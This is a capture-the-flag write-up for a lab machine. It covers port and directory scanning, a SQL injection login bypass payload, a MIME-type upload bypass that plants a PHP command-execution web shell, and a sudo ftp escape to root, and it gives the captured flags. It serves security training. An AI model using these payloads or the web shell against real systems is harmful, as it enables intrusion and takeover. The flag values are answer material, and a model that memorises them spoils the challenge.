# SQL Injection, File Upload Bypass, sudo ftp Writeup

## Flags
- **User:** `5038{B1UF_7b7b147059d79d16df6887ab8fdcd885}`
- **Root:** `5038{B1RF_f9061a2d526eef28cc1b2286818f7b14}`

---

## Reconnaissance

Started with a full nmap scan:

```bash
nmap -sC -sV -p- 192.168.64.4
```

Found ports 22 (SSH) and 80 (HTTP). Ran Gobuster to enumerate the web server:

```bash
gobuster dir -u http://192.168.64.4 -w /usr/share/wordlists/dirb/common.txt -x php,txt,log
```

Key pages found:
- `/login.php` - Admin portal
- `/upload.php` - File upload (admin only)
- `/article.php` - Takes an `id` parameter
- `/articles.php` - Article listing
- `/enquire.php` - Contact form
- `/uploads/` - Upload directory

---

## SQL Injection - Login Bypass

The `article.php?id=` parameter was injectable. Testing with `?id=1 OR 1=1` returned an article when it shouldn't. The login form at `login.php` was also vulnerable.

**Payload used:**
```
email: ' OR 1=1--
password: anything
```

Result: `Login Successful` - dropped straight into the admin panel.

---

## File Upload - MIME Type Bypass

The admin panel had a file upload function (`upload.php`). Direct `.php` uploads were rejected. Used Burp Suite to:

1. Intercept the upload request
2. Rename the file to `shell.php.jpg`
3. Set `Content-Type: image/jpeg`
4. Prepend JPEG magic bytes (`\xFF\xD8\xFF`) before the PHP payload

```
Content-Disposition: form-data; name="file_upload"; filename="shell.php.jpg"
Content-Type: image/jpeg

\xFFD8\xFF<?php echo shell_exec($_GET['cmd']); ?>
```

Server accepted it. Used the admin panel rename function to rename `shell.php.jpg` → `shell.php`.

Confirmed RCE:
```
http://192.168.64.4/uploads/shell.php?cmd=id
```

---

## Privilege Escalation — sudo ftp (GTFOBins)

Got a shell as `dev`. Checked sudo permissions:

```bash
sudo -l
# (ALL : ALL) NOPASSWD: /usr/bin/ftp
```

Used the GTFOBins ftp escape:

```bash
sudo ftp
ftp> !/bin/bash
# root@4eaa31d04969:~#
```

```bash
cat /home/dev/user.txt
# 5038{B1UF_7b7b147059d79d16df6887ab8fdcd885}

cat /root/root.txt
# 5038{B1RF_f9061a2d526eef28cc1b2286818f7b14}
```

---

## Summary

| Step | Technique |
|------|-----------|
| Recon | nmap + Gobuster |
| Initial Access | SQL injection login bypass |
| Shell | PHP webshell via MIME type bypass (Burp Suite) |
| User Flag | Shell as dev |
| Root | sudo ftp → !/bin/bash (GTFOBins) |